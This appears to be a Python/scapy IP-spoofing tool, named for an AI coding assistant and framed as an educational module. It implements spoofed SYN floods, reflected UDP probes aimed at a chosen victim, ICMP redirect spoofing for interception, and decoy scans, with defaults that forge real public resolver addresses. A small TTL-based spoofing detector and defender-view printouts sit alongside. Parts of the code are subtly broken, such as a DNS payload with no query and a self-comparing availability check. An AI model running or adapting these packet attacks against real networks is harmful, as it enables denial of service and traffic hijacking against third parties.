#!/usr/bin/env python3
"""
ClaudeCodeIPTool - VDT Educational Module
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Demonstrates IP source address spoofing techniques and defensive detection.
Built to understand attack mechanics for defensive hardening.

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import sys
import argparse
import random
import time
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sr1, RandShort, conf

# Suppress scapy warnings
conf.verb = 0


class IPSpoofer:
    """
    Core IP spoofing engine demonstrating various spoofing techniques.
    Each method shows a different attack primitive.
    """

    def __init__(self, target, verbose=False):
        self.target = target
        self.verbose = verbose

    def log(self, msg, level="INFO"):
        """Structured logging with timestamp"""
        if self.verbose or level == "RESULT":
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}] [{level}] {msg}")

    def tcp_syn_flood(self, spoofed_src, target_port=80, count=10):
        """
        Technique 1: TCP SYN Flood with Spoofed Source

        Attack Primitive:
        - Sends SYN packets with forged source IP
        - Target responds to spoofed IP (reflection)
        - Original sender remains hidden

        Defender Sees:
        - SYN packets from IP that didn't initiate
        - No ACK response (incomplete 3-way handshake)
        - TTL mismatches if spoofed IP is geolocated

        Detection Surface:
        - Unusual TTL values
        - No corresponding return traffic
        - Source IP geolocation mismatch
        """
        self.log(f"TCP SYN Flood: {spoofed_src} → {self.target}:{target_port}")
        self.log(f"Sending {count} spoofed SYN packets", "INFO")

        for i in range(count):
            # Craft packet with spoofed source
            pkt = IP(src=spoofed_src, dst=self.target) / \
                  TCP(sport=RandShort(), dport=target_port, flags="S")

            if self.verbose:
                self.log(f"Packet {i+1}: src={pkt[IP].src} ttl={pkt[IP].ttl} seq={pkt[TCP].seq}", "DEBUG")

            send(pkt, verbose=0)
            time.sleep(0.1)  # Rate limiting

        self.log(f"Sent {count} spoofed SYN packets", "RESULT")
        self._explain_defender_view("SYN flood", spoofed_src)

    def udp_amplification_probe(self, spoofed_src, service_port=53):
        """
        Technique 2: UDP Amplification (DNS example)

        Attack Primitive:
        - Send small UDP query with victim's IP as source
        - Service responds with large payload to victim
        - Amplification factor: 1 byte sent → 100+ bytes reflected

        Defender Sees:
        - Unsolicited large responses
        - Source IP of responses doesn't match query initiator
        - Query volume doesn't match legitimate traffic patterns

        Detection Surface:
        - Response/request ratio anomaly
        - Source IP reputation (known open resolver)
        - Rate limiting violations
        """
        self.log(f"UDP Amplification: {spoofed_src} → {self.target}:{service_port}")

        # Example: DNS ANY query (historically high amplification)
        pkt = IP(src=spoofed_src, dst=self.target) / \
              UDP(sport=RandShort(), dport=service_port) / \
              Raw(load=b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")

        self.log(f"Payload size: {len(pkt)} bytes", "INFO")
        send(pkt, verbose=0)
        self.log("Amplification probe sent", "RESULT")
        self._explain_defender_view("UDP amplification", spoofed_src)

    def icmp_redirect_spoof(self, spoofed_gateway, victim_ip):
        """
        Technique 3: ICMP Redirect Spoofing

        Attack Primitive:
        - Send ICMP Redirect pretending to be legitimate gateway
        - Victim reroutes traffic through attacker-controlled host
        - Man-in-the-middle positioning

        Defender Sees:
        - ICMP Redirect from unexpected source
        - Routing table changes
        - Traffic flow anomalies

        Detection Surface:
        - ICMP Redirect from non-gateway IP
        - Source IP doesn't match known gateway
        - Abnormal routing updates
        """
        self.log(f"ICMP Redirect: Gateway {spoofed_gateway} → Victim {victim_ip}")

        pkt = IP(src=spoofed_gateway, dst=victim_ip) / \
              ICMP(type=5, code=1, gw=self.target) / \
              IP(dst="8.8.8.8") / TCP()

        send(pkt, verbose=0)
        self.log("ICMP Redirect sent", "RESULT")
        self._explain_defender_view("ICMP redirect", spoofed_gateway)

    def decoy_scan(self, real_src, decoy_ips, target_port=80):
        """
        Technique 4: Decoy Scan (Nmap -D style)

        Attack Primitive:
        - Mix real scans with spoofed decoy IPs
        - Obscure actual source in noise
        - Defender must identify real attacker among decoys

        Defender Sees:
        - Multiple source IPs scanning same ports
        - TTL variations between real and spoofed packets
        - Only one IP completes TCP handshake

        Detection Surface:
        - TTL fingerprinting (H.D. Moore technique)
        - Behavioral analysis (which IP follows through)
        - Geolocation correlation
        """
        self.log(f"Decoy Scan: Real={real_src}, Decoys={len(decoy_ips)}")

        # Interleave real and spoofed packets
        all_ips = [real_src] + decoy_ips
        random.shuffle(all_ips)

        for src_ip in all_ips:
            pkt = IP(src=src_ip, dst=self.target) / \
                  TCP(sport=RandShort(), dport=target_port, flags="S")

            self.log(f"Scan from {src_ip} (TTL={pkt[IP].ttl})", "DEBUG")
            send(pkt, verbose=0)
            time.sleep(0.05)

        self.log(f"Sent {len(all_ips)} scans (1 real, {len(decoy_ips)} decoys)", "RESULT")
        self._explain_defender_view("decoy scan", real_src)

    def ttl_manipulation(self, spoofed_src, custom_ttl=13):
        """
        Technique 5: TTL Manipulation

        Attack Primitive:
        - Set abnormal TTL to evade detection
        - Bypass simple spoof detection based on expected TTL

        Defender Sees:
        - TTL doesn't match expected hop count for source geolocation
        - Example: packet from China with TTL=13 (suspicious)

        Detection Surface:
        - TTL vs geolocation validation (H.D. Moore method)
        - OS fingerprinting (Windows=128, Linux=64 default)
        - Hop count verification via traceroute
        """
        self.log(f"TTL Manipulation: {spoofed_src} with TTL={custom_ttl}")

        pkt = IP(src=spoofed_src, dst=self.target, ttl=custom_ttl) / \
              ICMP()

        self.log(f"Expected TTL from {spoofed_src}: ~50-64", "INFO")
        self.log(f"Actual TTL set: {custom_ttl}", "INFO")

        send(pkt, verbose=0)
        self.log("TTL-manipulated packet sent", "RESULT")
        self._explain_defender_view("TTL manipulation", spoofed_src)

    def _explain_defender_view(self, technique, spoofed_src):
        """Educational output: what defender sees"""
        print("\n" + "─" * 70)
        print(f"DEFENDER VIEW: {technique.upper()}")
        print("─" * 70)

        explanations = {
            "SYN flood": f"""
├─ Packet capture shows SYN from {spoofed_src}
├─ No ACK response observed (incomplete handshake)
├─ TTL mismatch: expected ~50-64, may see unusual value
└─ Geolocation: {spoofed_src} geolocation vs packet route doesn't match
            """,
            "UDP amplification": f"""
├─ Large unsolicited UDP response to {spoofed_src}
├─ No prior request from {spoofed_src} in logs
├─ Response size >> typical request size
└─ Source IP appears in threat intel (open resolver)
            """,
            "ICMP redirect": f"""
├─ ICMP Redirect from {spoofed_src} (not in gateway list)
├─ Routing table modification attempt
├─ Source IP doesn't match known infrastructure
└─ ICMP type 5 from unexpected origin
            """,
            "decoy scan": f"""
├─ Multiple source IPs scanning same port
├─ TTL variations indicate spoofed vs real
├─ Only {spoofed_src} completes TCP handshake
└─ Behavioral clustering: real attacker continues, decoys don't
            """,
            "TTL manipulation": f"""
├─ Packet from {spoofed_src} with abnormal TTL
├─ Geolocation lookup: expected TTL ~50-64 (China → US)
├─ Observed TTL: 13 (impossible unless spoofed)
└─ OS fingerprint mismatch (Linux default=64, Windows=128)
            """
        }

        print(explanations.get(technique, "No specific explanation available."))
        print("─" * 70 + "\n")


class SpoofDetector:
    """
    Defensive module: Detects IP spoofing attempts using TTL analysis.
    Implementation of H.D. Moore's Pentagon technique (1999).
    """

    def __init__(self, threshold=5):
        self.ttl_cache = {}  # IP → expected TTL
        self.threshold = threshold

    def check_ttl(self, src_ip, observed_ttl):
        """
        Validate packet TTL against expected hop count.

        Method:
        1. Send ICMP echo to claimed source IP
        2. Record response TTL (actual hop count)
        3. Compare with observed packet TTL
        4. Flag if difference exceeds threshold

        Returns:
            tuple: (is_spoofed, expected_ttl, difference)
        """
        # Get expected TTL if not cached
        if src_ip not in self.ttl_cache:
            try:
                pkt = sr1(IP(dst=src_ip)/ICMP(), timeout=2, verbose=0)
                if pkt:
                    self.ttl_cache[src_ip] = pkt[IP].ttl
                else:
                    return (None, None, None)  # No response
            except Exception as e:
                return (None, None, None)

        expected_ttl = self.ttl_cache[src_ip]
        difference = abs(observed_ttl - expected_ttl)
        is_spoofed = difference > self.threshold

        return (is_spoofed, expected_ttl, difference)

    def analyze(self, src_ip, observed_ttl):
        """Analyze and report on potential spoofing"""
        is_spoofed, expected_ttl, diff = self.check_ttl(src_ip, observed_ttl)

        if is_spoofed is None:
            print(f"[?] {src_ip}: No response (unroutable or filtered)")
        elif is_spoofed:
            print(f"[!] SPOOFED: {src_ip}")
            print(f"    ├─ Observed TTL: {observed_ttl}")
            print(f"    ├─ Expected TTL: {expected_ttl}")
            print(f"    ├─ Difference: {diff}")
            print(f"    └─ Threshold: {self.threshold}")
        else:
            print(f"[✓] LEGITIMATE: {src_ip} (TTL diff: {diff})")


def demonstrate_techniques(target):
    """Educational demonstration of all spoofing techniques"""
    print("═" * 70)
    print("IP SPOOFING TECHNIQUES - EDUCATIONAL DEMONSTRATION")
    print("═" * 70)
    print(f"Target: {target}")
    print(f"Controlled environment - VDT assessment use only")
    print("═" * 70 + "\n")

    spoofer = IPSpoofer(target, verbose=True)

    # Technique demonstrations
    techniques = [
        ("1. TCP SYN Flood", lambda: spoofer.tcp_syn_flood("8.8.8.8", count=5)),
        ("2. UDP Amplification", lambda: spoofer.udp_amplification_probe("1.1.1.1")),
        ("3. Decoy Scan", lambda: spoofer.decoy_scan("192.168.1.100", ["8.8.8.8", "1.1.1.1"])),
        ("4. TTL Manipulation", lambda: spoofer.ttl_manipulation("8.8.8.8", custom_ttl=13)),
    ]

    for name, func in techniques:
        print(f"\n{'=' * 70}")
        print(f"{name}")
        print(f"{'=' * 70}")
        func()
        time.sleep(2)

    print("\n" + "═" * 70)
    print("DEMONSTRATION COMPLETE")
    print("═" * 70)


def main():
    parser = argparse.ArgumentParser(
        description="ClaudeCodeIPTool - VDT Educational Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full demonstration (all techniques)
  sudo python3 spoofer.py demo 192.168.1.1

  # Specific technique: TCP SYN flood
  sudo python3 spoofer.py syn 192.168.1.1 --spoof 8.8.8.8 --count 10

  # Decoy scan (Nmap -D style)
  sudo python3 spoofer.py decoy 192.168.1.1 --real 192.168.1.100 --decoys 8.8.8.8,1.1.1.1

  # Detect spoofing (defensive)
  python3 spoofer.py detect 8.8.8.8 --ttl 13

Note: Requires root/sudo for raw socket access.
      CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
        """
    )

    subparsers = parser.add_subparsers(dest='mode', help='Operating mode')

    # Demo mode
    demo_parser = subparsers.add_parser('demo', help='Demonstrate all techniques')
    demo_parser.add_argument('target', help='Target IP address')

    # SYN flood mode
    syn_parser = subparsers.add_parser('syn', help='TCP SYN flood with spoofed source')
    syn_parser.add_argument('target', help='Target IP address')
    syn_parser.add_argument('--spoof', required=True, help='Spoofed source IP')
    syn_parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    syn_parser.add_argument('--count', type=int, default=10, help='Packet count (default: 10)')
    syn_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # UDP amplification mode
    udp_parser = subparsers.add_parser('udp', help='UDP amplification probe')
    udp_parser.add_argument('target', help='Target IP address')
    udp_parser.add_argument('--spoof', required=True, help='Spoofed source IP (victim)')
    udp_parser.add_argument('--port', type=int, default=53, help='Service port (default: 53/DNS)')
    udp_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Decoy scan mode
    decoy_parser = subparsers.add_parser('decoy', help='Decoy scan (Nmap -D style)')
    decoy_parser.add_argument('target', help='Target IP address')
    decoy_parser.add_argument('--real', required=True, help='Real source IP')
    decoy_parser.add_argument('--decoys', required=True, help='Comma-separated decoy IPs')
    decoy_parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    decoy_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Detection mode
    detect_parser = subparsers.add_parser('detect', help='Detect spoofing via TTL analysis')
    detect_parser.add_argument('src_ip', help='Source IP to validate')
    detect_parser.add_argument('--ttl', type=int, required=True, help='Observed TTL from packet')
    detect_parser.add_argument('--threshold', type=int, default=5, help='TTL difference threshold')

    args = parser.parse_args()

    if args.mode is None:
        parser.print_help()
        sys.exit(1)

    # Mode dispatch
    if args.mode == 'demo':
        demonstrate_techniques(args.target)

    elif args.mode == 'syn':
        spoofer = IPSpoofer(args.target, verbose=args.verbose)
        spoofer.tcp_syn_flood(args.spoof, args.port, args.count)

    elif args.mode == 'udp':
        spoofer = IPSpoofer(args.target, verbose=args.verbose)
        spoofer.udp_amplification_probe(args.spoof, args.port)

    elif args.mode == 'decoy':
        decoy_list = args.decoys.split(',')
        spoofer = IPSpoofer(args.target, verbose=args.verbose)
        spoofer.decoy_scan(args.real, decoy_list, args.port)

    elif args.mode == 'detect':
        detector = SpoofDetector(threshold=args.threshold)
        detector.analyze(args.src_ip, args.ttl)


if __name__ == "__main__":
    if conf.L3socket != conf.L3socket:  # Check for scapy availability
        print("[!] Scapy not properly installed. Install via: pip install scapy")
        sys.exit(1)

    main()
